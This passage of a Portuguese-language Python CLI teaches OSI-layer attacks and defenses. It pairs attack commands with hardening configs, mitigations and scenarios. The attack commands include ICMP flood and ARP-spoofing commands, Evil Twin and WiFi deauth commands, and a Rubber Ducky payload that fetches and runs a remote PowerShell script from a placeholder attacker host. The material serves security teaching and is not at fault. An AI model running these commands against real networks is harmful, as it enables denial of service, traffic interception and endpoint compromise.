            ("ARP",          "Address Resolution Protocol — IP→MAC (L2/L3 boundary)"),
            ("Router",       "Dispositivo que encaminha pacotes entre redes"),
            ("OSPF / BGP",   "Protocolos de routing interior e exterior"),
            ("NAT / PAT",    "Tradução de endereços privados para públicos"),
            ("IPsec",        "Encriptação de pacotes IP — base das VPNs"),
            ("RPKI",         "Resource PKI — valida rotas BGP com certificados"),
        ],
        "attacks": [
            {
                "id":    "L3-001",
                "name":  "IP Spoofing + ICMP Flood (Smurf Attack)",
                "risk":  "ALTO",
                "cause": "Sem validação de endereço IP de origem nos routers; amplificação por broadcast.",
                "impact":"DoS amplificado — tráfego de toda a rede direccionado para a vítima.",
                "tools_atk": [
                    ("Scapy",  "from scapy.all import *\nfor i in range(10000):\n    send(IP(src='VICTIM_IP',dst='BROADCAST_IP')/ICMP(), verbose=False)"),
                    ("hping3", "sudo hping3 --icmp --flood -a VICTIM_IP BROADCAST_IP"),
                    ("Nmap",   "nmap -sP --send-ip --spoof-mac 00:00:00:00:00:00 192.168.1.0/24"),
                ],
                "defense_commands": [
                    ("sysctl",    "# Activar Reverse Path Filtering (anti-spoofing):\nsysctl -w net.ipv4.conf.all.rp_filter=1\nsysctl -w net.ipv4.conf.default.rp_filter=1\n# Tornar permanente em /etc/sysctl.conf"),
                    ("iptables",  "# Bloquear IP Spoofing com rpfilter:\niptables -A INPUT -m rpfilter --invert -j DROP"),
                    ("sysctl",    "# Desactivar respostas ICMP a broadcasts (anti-Smurf):\nsysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1"),
                    ("Router",    "# Cisco — activar uRPF (Unicast Reverse Path Forwarding):\nip verify unicast source reachable-via rx"),
                ],
                "mitigation": [
                    "Activar Reverse Path Filtering (rp_filter=1) em todos os servidores Linux",
                    "Implementar uRPF nos routers de borda para bloquear IPs spoofados",
                    "Desactivar respostas ICMP a endereços broadcast (icmp_echo_ignore_broadcasts=1)",
                    "Configurar BCP38 (Network Ingress Filtering) nos routers do ISP",
                    "Rate limiting de ICMP em todos os firewalls",
                ],
                "scenario": (
                    "SCENARIO: Atacante envia 10.000 pings/seg com IP da vítima para o endereço "
                    "de broadcast da rede corporativa. 200 hosts respondem à vítima = amplificação 200x. "
                    "SOLUÇÃO: rp_filter=1 + icmp_echo_ignore_broadcasts=1 + uRPF no router."
                ),
            },
            {
                "id":    "L3-002",
                "name":  "BGP Hijacking (Desvio de Rotas Globais)",
                "risk":  "CRÍTICO",
                "cause": "BGP baseado em confiança; sem validação criptográfica de anúncios de prefixos.",
                "impact":"Tráfego de internet desviado por servidor do atacante — intercepção massiva.",
                "tools_atk": [
                    ("ExaBGP",   "# Anunciar prefixo fraudulento (em lab controlado):\nexabgp config.ini  # com neighbour e announce prefix 1.2.3.0/24"),
                    ("Monitor",  "# Monitorar BGP hijacks em tempo real:\ncurl https://bgpstream.crosswork.cisco.com/api/v2/hijacks"),
                ],
                "defense_commands": [
                    ("RPKI",       "# Validar rotas BGP com RPKI (Cisco IOS-XE):\nbgp rpki server tcp 192.0.2.1 port 323\nbgp bestpath prefix-validate allow-invalid\n!\nrouter bgp 65001\n bgp rpki server tcp 192.0.2.1"),
                    ("Filter",     "# Filtro de prefixos BGP — aceitar apenas prefixos conhecidos:\nip prefix-list ALLOWED permit 196.1.0.0/16 le 24\nroute-map BGP_IN permit 10\n match ip address prefix-list ALLOWED"),
                    ("Monitor",    "# Monitorar anúncios BGP suspeitos:\ncurl -s 'https://bgpmon.net/api/?data=hijacks' | python3 -m json.tool"),
                ],
                "mitigation": [
                    "Implementar RPKI (Resource Public Key Infrastructure) — valida rotas com PKI",
                    "Configurar filtros de prefix-list rigorosos nos peers BGP",
                    "Assinar ROA (Route Origin Authorization) para todos os prefixos próprios",
                    "Monitorar anúncios BGP com BGPmon, RIPE RIS Live ou Cloudflare Radar",
                    "Participar em MANRS (Mutually Agreed Norms for Routing Security)",
                ],
                "scenario": (
                    "SCENARIO: Atacante compromete router de ISP regional angolano e anuncia "
                    "196.10.0.0/24 (mais específico que /16 legítimo). Todo o tráfego para esse "
                    "bloco passa pelo atacante. Emails, DNS e HTTP em texto claro interceptados. "
                    "SOLUÇÃO: RPKI + ROA assinados + monitorização BGP permanente."
                ),
            },
        ],
        "tools_defense": {
            "RPKI Validator": {
                "desc": "Valida anúncios BGP contra ROAs",
                "install": "# Routinator (Cloudflare/NLnet Labs):\nwget https://github.com/NLnetLabs/routinator/releases/latest/download/routinator-linux-x86_64.tar.gz",
                "config":  "routinator init\nroutinator server --rtr 192.0.2.1:3323",
            },
            "Scapy (análise)": {
                "desc": "Análise e criação de pacotes IP para testes defensivos",
                "install": "pip3 install scapy",
                "config":  "from scapy.all import sniff, IP, TCP\nsniff(filter='ip src host SUSPICIOUS_IP', prn=lambda p: p.show(), count=100)",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    2: {
        "name_pt": "Camada de Enlace de Dados",
        "name_en": "Data Link Layer",
        "pdu":     "Frame",
        "color":   "red",
        "icon":    "🔗",
        "description": (
            "Controla o acesso ao meio físico e entrega de frames na rede local. "
            "Usa endereços MAC de 48 bits. É a camada do switch, Ethernet e WiFi. "
            "Muitos ataques internos exploram a confiança inerente desta camada."
        ),
        "elements": [
            ("Endereço MAC",  "48 bits: OUI (3B fabricante) + NIC (3B único)"),
            ("Ethernet 802.3","Protocolo LAN por cabo — frame: dst/src MAC, Type, Data, FCS"),
            ("WiFi 802.11",   "WPA2 (AES-CCMP), WPA3 (SAE) — segurança sem fio"),
            ("Switch",        "Encaminha frames por MAC table (CAM table)"),
            ("ARP",           "Resolve IP→MAC — vulnerável a ARP Spoofing"),
            ("VLANs 802.1Q",  "Segmentação lógica da rede no mesmo switch"),
            ("STP",           "Spanning Tree Protocol — previne loops em switches redundantes"),
            ("802.1X / NAC",  "Autenticação de porta antes de acesso à rede"),
            ("Port Security", "Limitar MACs permitidos por porta do switch"),
        ],
        "attacks": [
            {
                "id":    "L2-001",
                "name":  "ARP Spoofing / Poisoning (MITM Local)",
                "risk":  "CRÍTICO",
                "cause": "ARP é stateless e sem autenticação — qualquer host pode enviar ARP Replies falsos.",
                "impact":"Todo o tráfego da rede local passa pelo atacante (intercepção, manipulação).",
                "tools_atk": [
                    ("Bettercap", "sudo bettercap -iface eth0\n# Dentro do bettercap:\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nnet.sniff on"),
                    ("arpspoof",  "echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t VICTIM_IP GATEWAY_IP\narpspoof -i eth0 -t GATEWAY_IP VICTIM_IP  # bidireccional"),
                    ("Scapy",     "# ARP Reply falso:\nsend(ARP(op=2, pdst='192.168.1.5', psrc='192.168.1.1', hwdst='VICTIM_MAC'), loop=1, inter=2)"),
                ],
                "defense_commands": [
                    ("Cisco DAI",  "# Dynamic ARP Inspection — Cisco Switch:\nip arp inspection vlan 10\ninterface GigabitEthernet0/1\n  ip arp inspection trust  # apenas em uplinks"),
                    ("Linux",      "# Tornar ARP cache estático para gateway (Linux):\narp -s 192.168.1.1 AA:BB:CC:DD:EE:FF\n# Ou usar arptables:\narptables -A INPUT --opcode Reply --src-ip ! 192.168.1.1 -j DROP"),
                    ("Arpwatch",   "# Monitorar mudanças ARP (detectar spoofing):\narpwatch -i eth0 -m admin@empresa.ao\nsystemctl enable --now arpwatch"),
                    ("XArp",       "# Windows: instalar XArp para detecção de ARP Spoofing em tempo real"),
                ],
                "mitigation": [
                    "Activar Dynamic ARP Inspection (DAI) nos switches geridos",
                    "Configurar DHCP Snooping para criar binding table IP→MAC confiável",
                    "Instalar Arpwatch para alertas de mudança de MAC na rede",
                    "Usar redes comutadas com VLANs para limitar o domínio de broadcast",
                    "Implementar 802.1X (NAC) para autenticar dispositivos antes de entrar na rede",
                ],
                "scenario": (
                    "SCENARIO: Atacante em WiFi corporativo usa bettercap para se tornar MITM. "
                    "Captura credenciais de login ao ERP interno (HTTP) e tokens de sessão. "
                    "Em 5 minutos acede ao sistema financeiro. "
                    "SOLUÇÃO: DAI no switch + HTTPS everywhere + 802.1X WiFi Enterprise."
                ),
            },
            {
                "id":    "L2-002",
                "name":  "Evil Twin WiFi (Rogue Access Point)",
                "risk":  "CRÍTICO",
                "cause": "WiFi baseado em SSID não autenticado; clientes conectam ao AP com melhor sinal.",
                "impact":"Todos os dados WiFi passam pelo atacante: credenciais, tokens, emails.",
                "tools_atk": [
                    ("hostapd-wpe","# Criar Evil Twin com captura de credenciais EAP:\nsudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"),
                    ("aircrack-ng","airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon  # desautenticar clientes"),
                    ("bettercap",  "sudo bettercap\nwifi.recon on\nset wifi.ap.ssid 'Empresa_WiFi'\nwifi.ap on"),
                ],
                "defense_commands": [
                    ("WPA3 Ent",  "# Configurar WPA3 Enterprise com RADIUS:\n# RADIUS autentica utilizador → certificado mútuo → Evil Twin impossível"),
                    ("802.1X",    "# Configurar 802.1X com certificado de servidor:\n# Cliente verifica certificado do AP → detecta Evil Twin automaticamente"),
                    ("Kismet",    "# Monitorar Evil Twins continuamente:\nkismet --monitor-capture wlan0mon\n# Alertar quando BSSID não reconhecido usa SSID corporativo"),
                    ("Policy",    "# Política: proibir acesso a sistemas críticos via WiFi público\n# Obrigar VPN para qualquer acesso externo"),
                ],
                "mitigation": [
                    "Usar WPA3 Enterprise (802.1X com RADIUS e certificados mútuos)",
                    "Verificar certificado do servidor WiFi nos clientes (evita Evil Twin)",
                    "Implementar VPN obrigatória para acesso a sistemas críticos",
                    "Monitorar espectro WiFi com Kismet para detectar APs rogues",
                    "Treinar utilizadores para não ignorar alertas de certificado WiFi",
                ],
                "scenario": (
                    "SCENARIO: Atacante em café cria Evil Twin 'BAI_WIFI_FREE' idêntico ao WiFi "
                    "do banco próximo. Funcionários do banco conectam durante pausa de almoço. "
                    "Credenciais do email corporativo capturadas via SSLStrip. "
                    "SOLUÇÃO: WPA3 Enterprise + VPN obrigatória + HSTS no email corporativo."
                ),
            },
        ],
        "tools_defense": {
            "Arpwatch": {
                "desc": "Monitorar mudanças ARP na rede local",
                "install": "apt install arpwatch -y\nsystemctl enable --now arpwatch",
                "config":  "arpwatch -i eth0 -m security@empresa.ao\n# Envia email quando detecta ARP flip ou novo dispositivo",
            },
            "Kismet": {
                "desc": "WIDS — detectar APs rogues e Evil Twin",
                "install": "apt install kismet -y",
                "config":  "kismet -c wlan0  # iniciar em modo monitor\n# Aceder interface web: http://localhost:2501",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    1: {
        "name_pt": "Camada Física",
        "name_en": "Physical Layer",
        "pdu":     "Bit",
        "color":   "bright_black",
        "icon":    "⚡",
        "description": (
            "Transmissão de bits brutos pelo meio físico: cabos, wireless, fibra. "
            "A fundação de toda a comunicação. Uma falha ou ataque nesta camada "
            "derruba TUDO acima dela. Segurança física é frequentemente ignorada."
        ),
        "elements": [
            ("Cabos UTP/STP",    "Cat5e/Cat6/Cat6a/Cat8 — Ethernet por cobre (RJ45)"),
            ("Fibra Óptica",     "Single-mode (longa distância), Multi-mode (curta)"),
            ("WiFi RF",          "2.4GHz, 5GHz, 6GHz (WiFi 6E), 60GHz (WiGig)"),
            ("Hubs",             "Obsoletos — retransmitem bits em broadcast (substituir por switches)"),
            ("NICs",             "Network Interface Cards — hardware de adaptação de rede"),
            ("PoE",              "Power over Ethernet — alimentar dispositivos pelo cabo (802.3af/at)"),
            ("Patch Panel",      "Organização de conexões em rack de data center"),
            ("CCTV / Câmeras IP","Dispositivos físicos de vigilância (IoT)"),
        ],
        "attacks": [
            {
                "id":    "L1-001",
                "name":  "Rogue USB / Rubber Ducky (HID Attack)",
                "risk":  "CRÍTICO",
                "cause": "Sistemas tratam dispositivos HID USB como confiáveis por defeito.",
                "impact":"Execução imediata de código malicioso sem interacção do utilizador.",
                "tools_atk": [
                    ("Rubber Ducky","# DuckyScript — executado em <3 segundos:\nDELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w hidden -c IEX(IWR 'http://atk.com/payload.ps1');\nENTER"),
                    ("Bash Bunny",  "# Payload Bash Bunny (emula teclado + ethernet):\nATTACK SWITCH1\npayload.sh → exfiltrar dados ou instalar RAT"),
                    ("PS Check",    "# PowerShell — detectar USB inseridos:\nGet-PnpDevice -Class USB | Where Status -eq 'OK'"),
                ],
                "defense_commands": [
                    ("GPO",    "# Desactivar autorun de USB via GPO:\n# Computer Config → Admin Templates → Windows Components\n# → AutoPlay Policies → Turn off AutoPlay → ALL DRIVES → ENABLED"),
                    ("Defender","# Microsoft Defender Device Control (via Intune/GPO):\n# Block all USB storage devices by default\n# Allow only approved devices by DeviceID"),
                    ("PS",     "# PowerShell — bloquear USB storage:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR' -Name Start -Value 4"),
                    ("Sysmon", "# Detectar USB via Sysmon Event ID 6 (driver load):\n<RuleGroup name='' groupRelation='or'><DriverLoad onmatch='include'><Signed condition='is'>false</Signed></DriverLoad></RuleGroup>"),
                ],
                "mitigation": [
                    "Desactivar autorun de USB completamente via GPO em todos os endpoints",
                    "Usar Microsoft Defender ATP Device Control para whitelist de USBs",
                    "Campanha de awareness: nunca ligar USBs não identificados",
                    "Bloquear fisicamente portas USB não utilizadas (USB port blockers)",
                    "Monitorar inserção de novos dispositivos USB via Sysmon Event ID 6",
                ],
                "scenario": (
                    "SCENARIO: Atacante deixa 5 pens USB com logo de empresa no parque de "
                    "estacionamento. Colaborador curioso liga no PC. Rubber Ducky executa reverse "
                    "shell PowerShell em 3 segundos. Atacante tem acesso total ao endpoint. "
                    "SOLUÇÃO: GPO disable autorun + Defender Device Control + awareness training."
                ),
            },
            {
                "id":    "L1-002",
                "name":  "WiFi Jamming (Interferência RF)",
                "risk":  "ALTO",
                "cause": "Espectro de rádio é um meio partilhado e sem autenticação física.",
                "impact":"Rede WiFi completamente inutilizável — DoS físico sem acesso à rede.",
                "tools_atk": [
                    ("MDK4",      "sudo mdk4 wlan0mon d -b blacklist.txt  # beacon flood + deauth"),
                    ("aireplay",  "sudo aireplay-ng --deauth 0 -a BSSID wlan0mon  # deauth contínuo"),
                    ("SDR",       "# Jammers RF dedicados (hardware) — ILEGAL em qualquer contexto"),
                ],
                "defense_commands": [
                    ("Dual-band", "# Usar WiFi 5GHz + 6GHz — menos interferência e dispositivos jamming\n# 6GHz (WiFi 6E) tem alcance menor mas mais resistente a jamming"),
                    ("WIDS",      "# Kismet como WIDS para detectar deauth floods:\nkismet -c wlan0\n# Alertar quando > 50 deauth frames/segundo detectados"),
                    ("5GHz",      "# Migrar para 5GHz/6GHz onde possível\n# Usar 802.11r (Fast BSS Transition) para roaming rápido entre APs"),
                    ("Cabling",   "# Para ambientes críticos: usar Ethernet com cabo (L1 mais seguro que WiFi)"),
                ],
                "mitigation": [
                    "Usar frequências 5GHz e 6GHz (WiFi 6E) — menos susceptíveis a jamming",
                    "Para ambientes críticos: usar cabos Ethernet em vez de WiFi",
                    "Monitorar espectro RF com Kismet para detectar deauth floods",
                    "Implementar 802.11w (Protected Management Frames) para proteger deauth",
                    "Ter link de backup (4G/5G) para continuidade em caso de jamming",
                ],
                "scenario": (
                    "SCENARIO: Durante conferência importante, atacante usa mdk4 para enviar "
                    "deauth frames contínuos. WiFi do hotel completamente inacessível. "
                    "Apresentações via WiFi impossíveis. SOLUÇÃO: 802.11w (PMF) torna deauth "
                    "attacks ineficazes + ter fallback por cabo Ethernet."
                ),
            },
        ],
        "tools_defense": {
            "Physical Security Checklist": {
                "desc": "Checklist de segurança física da infraestrutura",
                "install": "# Verificar:\n# [ ] Racks com cadeado\n# [ ] CCTV cobrindo servidores\n# [ ] Controlo de acesso biométrico\n# [ ] Inventário de cabos e portas",
                "config":  "# Ferramentas de monitorização física:\n# Nagios / Zabbix: monitorar estado de interfaces\n# zabbix_get -s host -k 'net.if.status[eth0]'",
            },
            "Nagios / Zabbix": {
                "desc": "Monitorar interfaces e conectividade física",
                "install": "apt install zabbix-agent2 -y\nsystemctl enable --now zabbix-agent2",
                "config":  "zabbix_get -s 127.0.0.1 -k 'net.if.status[eth0]'\nzabbix_get -s 127.0.0.1 -k 'net.if.in[eth0,errors]'",
            },
        },
    },
}

# ══════════════════════════════════════════════════════════════════════════════
# ██  DISPLAY ENGINE
# ══════════════════════════════════════════════════════════════════════════════
LAYER_COLORS = {7:"bright_magenta", 6:"bright_blue", 5:"bright_cyan",
                4:"bright_green",   3:"bright_yellow", 2:"red", 1:"white"}

def banner():
    console.clear()
    console.print()
    console.print(Panel(
        Text.from_markup(
            "[bright_cyan]██████╗  █████╗  ██████╗ ██████╗     ████████╗███████╗ ██████╗██╗  ██╗[/]\n"
            "[bright_cyan]██╔══██╗██╔══██╗██╔═══██╗██╔══██╗       ██╔══╝██╔════╝██╔════╝██║  ██║[/]\n"
            "[bright_cyan]███████║██║  ██║██████╔╝ ██████╔╝        ████╗  █████╗ ██║     ███████║[/]\n"
            "[bright_cyan]██╔══██║██║  ██╔╝██╔══██╗██╔══██╗       ╚═██╔═╝██╔══╝ ██║     ██╔══██║[/]\n"
            "[bright_cyan]██║  ██║╚██████╔╝██║  ██║██║  ██║         ██║  ███████╗╚██████╗██║  ██║[/]\n"
            "[bright_cyan]╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝         ╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝[/]\n\n"
            "          [bold white]OSI MODEL — ATTACK & DEFENSE RESOLVER  v2.0[/]\n"
            "   [dim]Alfredo Ociola Francisco Romano  |  AOFR TECH  |  Angola[/]\n"
            "       [italic bright_yellow]\"Atitude · Orientação · Força · Resultados\"[/]"
        ),
        border_style="bright_cyan",
        padding=(1, 4),
    ))
    console.print(
        Panel(
            "[bold red]⚠  USO EXCLUSIVAMENTE EDUCACIONAL E EM AMBIENTES AUTORIZADOS  ⚠[/]",
            border_style="red", padding=(0,2)
        )
    )
    console.print()

def osi_overview():
    """Mostrar diagrama OSI completo"""
    table = Table(
        title="📡  MODELO OSI — 7 CAMADAS",
        box=box.DOUBLE_EDGE,
        border_style="bright_cyan",
        show_lines=True,
        header_style="bold bright_cyan",
        title_style="bold bright_white",
    )
    table.add_column("Nº",        style="bold",    width=4,  justify="center")
    table.add_column("Camada",    style="bold",    width=22)
    table.add_column("PDU",       width=12,        justify="center")
    table.add_column("Protocolos Chave", width=38)
    table.add_column("Ataques Principais", width=35)

    data = [
        (7,"🌐 [bright_magenta]Aplicação[/]",     "Dados",    "HTTP·HTTPS·DNS·FTP·SSH·SMTP","SQLi·XSS·SSRF·FileUpload·DDoS L7"),
        (6,"🔐 [bright_blue]Apresentação[/]",      "Dados",    "TLS·SSL·Base64·GZIP·JSON·XML","TLS Downgrade·Desserialização"),
        (5,"🤝 [bright_cyan]Sessão[/]",            "Dados",    "SMB·NetBIOS·RPC·Kerberos·NTLM","PtH·Kerberoast·SMB Relay·LLMNR"),
        (4,"🚦 [bright_green]Transporte[/]",       "Segmento", "TCP·UDP·Portas·TLS Handshake","SYN Flood·Port Scan·UDP Flood"),
        (3,"🌍 [bright_yellow]Rede[/]",            "Pacote",   "IP·ICMP·ARP·OSPF·BGP·IPsec","IP Spoof·BGP Hijack·ICMP Flood"),
        (2,"🔗 [red]Enlace de Dados[/]",           "Frame",    "Ethernet·WiFi·802.1Q·STP·ARP","ARP Spoof·VLAN Hop·Evil Twin"),
        (1,"⚡ [white]Física[/]",                  "Bit",      "RJ45·Fibra·WiFi RF·PoE·USB","USB Malicioso·Jamming·Wiretap"),
    ]
    for num, name, pdu, protos, attacks in data:
        table.add_row(str(num), name, pdu, protos, attacks)

    console.print(table)
    console.print()

def show_layer_menu():
    """Menu principal de selecção de camada"""
    console.print(Rule("[bold bright_cyan]SELECCIONAR CAMADA OSI[/]", style="bright_cyan"))
    console.print()
    for n in range(7, 0, -1):
        layer = OSI_LAYERS[n]
        col   = LAYER_COLORS[n]
        attacks_count = len(layer["attacks"])
        console.print(
            f"  [{col}][{n}][/] {layer['icon']}  [{col}]{layer['name_pt']:<28}[/] "
            f"[dim]│ PDU: {layer['pdu']:<12} │ {attacks_count} ataques documentados[/]"
        )
    console.print()
    console.print("  [dim][0] Visão geral de todas as camadas[/]")
    console.print("  [dim][A] Modo busca de ataque por nome / keyword[/]")
    console.print("  [dim][D] Modo busca de ferramenta de defesa[/]")
    console.print("  [dim][R] Relatório completo de uma camada (texto)[/]")
    console.print("  [dim][Q] Sair[/]")
    console.print()

def show_layer(layer_num: int):
    """Mostrar informação completa de uma camada"""
    layer = OSI_LAYERS[layer_num]
    col   = LAYER_COLORS[layer_num]

    console.print()
    console.print(Panel(
        f"[bold {col}]CAMADA {layer_num} — {layer['name_pt'].upper()}[/]\n"
        f"[dim]PDU: {layer['pdu']}  |  {layer['name_en']}  |  {layer['icon']}[/]\n\n"
        f"[white]{layer['description']}[/]",
        border_style=col, padding=(1,2)
    ))

    # Elementos
    console.print(Rule(f"[{col}]Elementos e Protocolos[/]", style=col))
    elem_table = Table(box=box.SIMPLE_HEAD, border_style="dim", show_header=True,
                       header_style=f"bold {col}")
    elem_table.add_column("Elemento/Protocolo", width=20)
    elem_table.add_column("Descrição", width=58)
    for elem, desc in layer["elements"]:
        elem_table.add_row(f"[{col}]{elem}[/]", desc)
    console.print(elem_table)

    # Ataques
    console.print(Rule("[bold red]Ataques Documentados[/]", style="red"))
    for i, atk in enumerate(layer["attacks"]):
        risk_colors = {"CRÍTICO":"bold red","ALTO":"bold yellow","MÉDIO":"bold cyan","BAIXO":"bold green"}
        rc = risk_colors.get(atk["risk"], "white")
        console.print(Panel(
            f"[{rc}][ {atk['id']} ]  {atk['name']}  —  RISCO: {atk['risk']}[/]\n\n"
            f"[dim]Causa:[/] {atk['cause']}\n"
            f"[dim]Impacto:[/] {atk['impact']}",
            border_style="red" if atk["risk"]=="CRÍTICO" else "yellow",
            padding=(0,2)
        ))

        atk_table = Table(box=box.SIMPLE, border_style="dim", title="⚔️  Ferramentas de Ataque (APENAS USO EDUCACIONAL)",
                          title_style="bold red", show_header=True, header_style="bold red")
        atk_table.add_column("Ferramenta", width=16, style="red")
        atk_table.add_column("Comando", style="bright_red", width=72)
        for tool, cmd in atk["tools_atk"]:
            atk_table.add_row(tool, cmd)
        console.print(atk_table)

        def_table = Table(box=box.SIMPLE, border_style="dim", title="🛡️  Comandos de Defesa",
                          title_style="bold green", show_header=True, header_style="bold green")
        def_table.add_column("Contexto", width=12, style="green")
        def_table.add_column("Comando / Configuração", style="bright_green", width=76)
        for ctx, cmd in atk["defense_commands"]:
            def_table.add_row(ctx, cmd)
        console.print(def_table)

        console.print(Panel(
            "[bold bright_cyan]MITIGAÇÕES RECOMENDADAS[/]\n" +
            "\n".join(f"  [bright_cyan]→[/] {m}" for m in atk["mitigation"]),
            border_style="bright_cyan", padding=(0,2)
        ))

        console.print(Panel(
            f"[bold yellow]📋 CENÁRIO REAL[/]\n\n[italic]{atk['scenario']}[/]",
            border_style="yellow", padding=(0,2)
        ))
        console.print()

    # Ferramentas de defesa
    if layer.get("tools_defense"):
        console.print(Rule(f"[{col}]Ferramentas de Defesa — Instalação e Configuração[/]", style=col))
        for tool_name, tool_data in layer["tools_defense"].items():
            console.print(Panel(
                f"[bold green]{tool_name}[/]  [dim]—  {tool_data['desc']}[/]\n\n"
                f"[bright_cyan]# INSTALAÇÃO:[/]\n[white]{tool_data['install']}[/]\n\n"
                f"[bright_cyan]# CONFIGURAÇÃO:[/]\n[white]{tool_data['config']}[/]",
                border_style="green", padding=(0,2)
            ))

def show_layer_attacks_table(layer_num: int):
    """Tabela rápida de ataques de uma camada"""
    layer = OSI_LAYERS[layer_num]
    col   = LAYER_COLORS[layer_num]

    table = Table(
        title=f"{layer['icon']} Camada {layer_num} — {layer['name_pt']} — Ataques & Defesas",
        box=box.DOUBLE, border_style=col, show_lines=True,
        header_style=f"bold {col}", title_style=f"bold {col}"
    )
    table.add_column("ID",      width=8,  justify="center")
    table.add_column("Ataque",  width=30)
    table.add_column("Risco",   width=9,  justify="center")
    table.add_column("Causa",   width=38)
    table.add_column("Defesa Principal", width=34)

    for atk in layer["attacks"]:
        risk_s = {"CRÍTICO":"[bold red]CRÍTICO[/]","ALTO":"[bold yellow]ALTO[/]",
                  "MÉDIO":"[bold cyan]MÉDIO[/]","BAIXO":"[bold green]BAIXO[/]"}.get(atk["risk"], atk["risk"])
        first_def = atk["defense_commands"][0][1][:60] + "..." if len(atk["defense_commands"][0][1]) > 60 else atk["defense_commands"][0][1]
        table.add_row(atk["id"], atk["name"], risk_s, atk["cause"][:80], first_def)

    console.print(table)

def search_attack(keyword: str):
    """Procurar ataque por keyword em todas as camadas"""
    keyword = keyword.strip().lower()
    console.print(Rule(f"[bold yellow]🔍 PROCURAR: '{keyword}'[/]", style="yellow"))
    found = 0
    for layer_num, layer in OSI_LAYERS.items():
        for atk in layer["attacks"]:
            searchable = (atk["name"] + atk["cause"] + atk["impact"] +
                          " ".join(t for t,_ in atk["tools_atk"])).lower()
            if keyword in searchable:
                found += 1
                col = LAYER_COLORS[layer_num]
                risk_colors = {"CRÍTICO":"red","ALTO":"yellow","MÉDIO":"cyan","BAIXO":"green"}
                rc = risk_colors.get(atk["risk"], "white")
                console.print(Panel(
                    f"[{col}]Camada {layer_num} — {layer['name_pt']}[/]  [{rc}][{atk['id']}] {atk['name']}[/]  "
                    f"RISCO: [{rc}]{atk['risk']}[/]\n\n"
                    f"[dim]Causa:[/] {atk['cause']}\n"
                    f"[dim]Impacto:[/] {atk['impact']}\n\n"
                    f"[bold red]FERRAMENTAS ATAQUE:[/] " + " | ".join(t for t,_ in atk["tools_atk"][:3]) + "\n"
                    f"[bold green]DEFESA PRINCIPAL:[/] {atk['defense_commands'][0][1][:100]}",
                    border_style=col, padding=(0,2)
                ))
    if found == 0:
        console.print(f"[yellow]Nenhum resultado para '{keyword}'.[/]")
    else:
        console.print(f"\n[dim]Total: {found} resultado(s) encontrado(s)[/]")

def search_defense_tool(keyword: str):
    """Procurar ferramenta de defesa"""
    keyword = keyword.strip().lower()
    console.print(Rule(f"[bold green]🛡️ FERRAMENTA DE DEFESA: '{keyword}'[/]", style="green"))
    found = 0
    for layer_num, layer in OSI_LAYERS.items():
        for tool_name, tool_data in layer.get("tools_defense", {}).items():
            if keyword in tool_name.lower() or keyword in tool_data["desc"].lower():
                found += 1
                col = LAYER_COLORS[layer_num]
                console.print(Panel(
                    f"[{col}]Camada {layer_num} — {layer['name_pt']}[/]\n\n"
                    f"[bold green]{tool_name}[/]  —  {tool_data['desc']}\n\n"
                    f"[bright_cyan]INSTALAÇÃO:[/]\n{tool_data['install']}\n\n"
                    f"[bright_cyan]CONFIGURAÇÃO:[/]\n{tool_data['config']}",
                    border_style="green", padding=(0,2)
                ))
    if found == 0:
        console.print(f"[yellow]Nenhuma ferramenta para '{keyword}'.[/]")

def full_report(layer_num: int):
    """Relatório completo em texto para copy-paste / relatórios"""
    layer = OSI_LAYERS[layer_num]
    console.print()
    console.print(Rule("[bold bright_white]RELATÓRIO COMPLETO — MODO TEXTO[/]"))
    report_lines = [
        f"=" * 80,
        f"AOFR TECH — OSI RESOLVER — RELATÓRIO CAMADA {layer_num}",
        f"Gerado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"=" * 80,
        "",
        f"CAMADA {layer_num}: {layer['name_pt'].upper()} ({layer['name_en']})",
        f"PDU: {layer['pdu']}",
        "-" * 60,
        layer["description"],
        "",
        "ELEMENTOS:",
    ]
    for elem, desc in layer["elements"]:
        report_lines.append(f"  • {elem}: {desc}")
    report_lines.append("")
    for atk in layer["attacks"]:
        report_lines += [
            "=" * 60,
            f"[{atk['id']}] {atk['name']}",
            f"RISCO: {atk['risk']}",
            f"CAUSA: {atk['cause']}",
            f"IMPACTO: {atk['impact']}",
            "",
            "FERRAMENTAS DE ATAQUE (uso educacional/laboratorial):",
        ]
        for tool, cmd in atk["tools_atk"]:
            report_lines.append(f"  [{tool}] {cmd}")
        report_lines += ["", "COMANDOS DE DEFESA:"]
        for ctx, cmd in atk["defense_commands"]:
            report_lines.append(f"  [{ctx}]\n  {cmd}")
        report_lines += ["", "MITIGAÇÕES:"]
        for m in atk["mitigation"]:
            report_lines.append(f"  → {m}")
        report_lines += ["", "CENÁRIO REAL:"]
        report_lines.append(textwrap.fill(atk["scenario"], width=76, initial_indent="  ", subsequent_indent="  "))
        report_lines.append("")

    full_text = "\n".join(report_lines)
    # Save to file
    fname = f"aofr_camada{layer_num}_relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), fname)
    try:
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(full_text)
        console.print(Syntax(full_text[:3000], "text", theme="monokai", line_numbers=False))
        console.print(f"\n[bold green]✅  Relatório guardado em: {out_path}[/]")
    except Exception as e:
        console.print(Syntax(full_text[:3000], "text", theme="monokai"))
        console.print(f"[yellow]Nota: não foi possível guardar ficheiro: {e}[/]")

def layer_submenu(layer_num: int):
    """Submenu de opções para uma camada específica"""
    layer = OSI_LAYERS[layer_num]
    col   = LAYER_COLORS[layer_num]
    while True:
        console.print()
        console.print(Rule(f"[{col}]{layer['icon']} Camada {layer_num} — {layer['name_pt']}[/]", style=col))
        console.print(f"\n  [dim][1][/] Ver informação completa com comandos")
        console.print(f"  [dim][2][/] Tabela rápida de ataques & defesas")
        console.print(f"  [dim][3][/] Relatório texto completo (para copiar/guardar)")
